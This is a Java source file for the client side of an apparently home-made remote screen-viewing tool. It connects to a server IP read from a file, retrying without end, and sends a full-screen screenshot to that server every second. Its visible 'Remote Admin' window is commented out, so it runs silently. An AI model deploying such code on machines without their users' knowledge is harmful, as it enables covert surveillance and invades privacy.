import javax.imageio.ImageIO;
import javax.swing.*;
import java.awt.*;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.awt.event.WindowAdapter;
import java.awt.event.WindowEvent;
import java.awt.image.BufferedImage;
import java.io.*;
import java.net.InetAddress;
import java.net.Socket;
import java.util.Scanner;
import java.util.concurrent.TimeUnit;

class Sender2
{

    static int port;
    Sender2(String ip, int port) throws Exception {
        Socket soc= null;
        boolean flag=true;
        while (flag){

            try {
                soc = new Socket(ip,port);
                flag=false;
            } catch (IOException e) {
                System.out.println("trying  "+port);
                flag=true;
            }
        }
        OutputStream os= null;
        try {
            os = soc.getOutputStream();
        } catch (IOException e) {
            e.printStackTrace();
        }
//        JFrame frame = new JFrame("Remote Admin");
//        JButton button= new JButton("Terminate");
//
//        frame.setBounds(100,100,150,150);
//        frame.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
//        frame.add(button);
//        button.addActionListener( new ActionListener() {
//                                      public void actionPerformed(ActionEvent e) {
//                                          System.exit(0);
//                                      }
//                                  }
//        );
//        frame.addWindowListener(new WindowAdapter()
//        {
//            public void windowClosing(WindowEvent e)
//            {
//                System.exit(0);
//            }
//        });
//        frame.setVisible(true);
        while (true)
        {

            try
            {
                {
                    BufferedImage image=new Robot().createScreenCapture(new Rectangle(Toolkit.getDefaultToolkit().getScreenSize()));
                    ByteArrayOutputStream baos=new ByteArrayOutputStream();
                    ImageIO.write(image,"png",baos);
                    baos.close();
                    ObjectOutputStream oos=new ObjectOutputStream(os);
                    oos.writeObject(baos.size());
                    os.write(baos.toByteArray());
                    System.out.println("Image Sent  "+port);
                }


                TimeUnit.MILLISECONDS.sleep(1000);



            }
            catch(Exception e)
            {
//                frame.dispose();
                String[] args = new String[0];
                main(args);
            }

        }
    }
    public static void main(String aerg[])throws Exception
    {
        //String ip = JOptionPane.showInputDialog("Please enter server IP");
        //String port = JOptionPane.showInputDialog("Please enter server port");
        Scanner in = new Scanner(new FileReader("client.dat"));
        String server_ip=in.nextLine();
        String IP=InetAddress.getLocalHost().getHostAddress();

        String [] temp=IP.split("\\."); //split returns an array
        port= Integer.parseInt(temp[3])+(5000);
        new Sender2(server_ip,8000);
    }

}
